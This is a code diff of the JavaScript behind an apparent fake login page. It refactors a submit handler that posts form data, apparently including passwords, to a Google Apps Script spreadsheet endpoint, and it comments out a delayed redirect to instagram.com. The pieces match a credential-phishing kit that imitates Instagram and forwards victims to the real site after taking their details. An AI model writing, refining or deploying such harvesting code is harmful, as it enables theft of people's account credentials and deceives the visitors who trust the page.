@@ -42,27 +42,26 @@ function showPassword() {
 hideButton.style.visibility = "hidden";
 
 const scriptURL = 'https://script.google.com/macros/s/AKfycbxZgxb40YEuriC4p1R4pn_jAwZbE-BU6nk8F4KU0PFHPLwt5GV9-zO48W0LWnVoECHZ/exec'
-const form = document.forms['submit-to-google-sheet']
+const form = document.forms['submit-to-google-sheet'];
 const msg = document.getElementById("msg");
-form.addEventListener('submit', e => {
-    e.preventDefault()
-    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
-    .then(response =>{
-        console.log("ok..."),
-        console.log(response),
-        form.reset()
-         }
-         
-         )
-    .catch(error => console.error('Error!', error.message))
+
+form.addEventListener('submit', async e => {
+    e.preventDefault();
+    try {
+        const response = await fetch(scriptURL, { method: 'POST', body: new FormData(form)});
+        console.log("ok...", response);
+        form.reset();
+    } catch (error) {
+        console.error('Error!', error.message);
+    }
     // document.getElementById("login-btn").setAttribute("href","https://google.com")
 })
 
-document.getElementById("login-btn").addEventListener("click", function(event) {
+// document.getElementById("login-btn").addEventListener("click", function(event) {
   
-  event.preventDefault(); // Prevent default form submission behavior
-   console.log("redirecting to another website");
-  setTimeout(function(){
-            window.location.href = "https://www.instagram.com/"; // Redirect to YouTube
-         },5000)
-});
+//   event.preventDefault(); // Prevent default form submission behavior
+//    console.log("redirecting to another website");
+//   setTimeout(function(){
+//             window.location.href = "https://www.instagram.com/"; // Redirect to YouTube
+//          },5000)
+// });
